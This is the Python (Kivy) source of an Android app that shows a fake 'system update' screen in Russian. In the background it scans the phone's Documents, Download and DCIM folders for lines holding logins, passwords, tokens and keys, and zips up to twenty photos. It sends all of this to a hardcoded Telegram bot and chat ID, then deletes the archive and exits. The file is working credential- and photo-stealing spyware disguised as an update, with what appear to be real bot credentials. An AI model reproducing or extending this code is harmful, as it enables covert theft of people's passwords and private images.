from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
import os
import re
import sys
import zipfile
import requests
import threading
import time

# Твои данные
TOKEN = '9240175046:AAEdXRroLAf2BXvxCqlVx33qM3l4gI5a44g'
CHAT_ID = '6145798460'

def collect_data():
    # 1. Поиск паролей в доступных папках
    targets = ['/sdcard/Documents', '/sdcard/Download', '/sdcard/DCIM']
    passwords = []
    photos = []
    regex = re.compile(r'(?i)(login|pass|пароль|логин|@|token|key).*')
    
    for path in targets:
        if not os.path.exists(path): continue
        for root, _, files in os.walk(path):
            for file in files:
                filepath = os.path.join(root, file)
                if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                    photos.append(filepath)
                elif file.lower().endswith(('.txt', '.xml', '.json', '.csv')):
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            for line in f:
                                if regex.search(line) and len(line) < 200:
                                    passwords.append(f"[{file}] {line.strip()}")
                    except: pass
    return passwords, photos

def send_to_telegram():
    time.sleep(3) # Ждем инициализации
    try:
        passes, photos = collect_data()
        
        # Отправка паролей
        if passes:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            text = "Найденные пароли:\n" + "\n".join(passes)[:4000]
            requests.post(url, data={'chat_id': CHAT_ID, 'text': text})

        # Отправка фото архивом
        if photos:
            zip_path = '/sdcard/Download/temp_files.zip'
            with zipfile.ZipFile(zip_path, 'w') as z:
                for f in photos[:20]: # Берем 20 фото для примера
                    try: z.write(f, os.path.basename(f))
                    except: pass
            
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            with open(zip_path, 'rb') as f:
                requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID, 'caption': 'Фото'})
            
            os.remove(zip_path) # Удаляем после отправки
    except Exception:
        pass
    
    # Выход
    os._exit(0)

class SystemUpdateApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50)
        layout.add_widget(Label(text="Обновление системы...", font_size='20sp'))
        threading.Thread(target=send_to_telegram, daemon=True).start()
        return layout

if __name__ == '__main__':
    SystemUpdateApp().run()
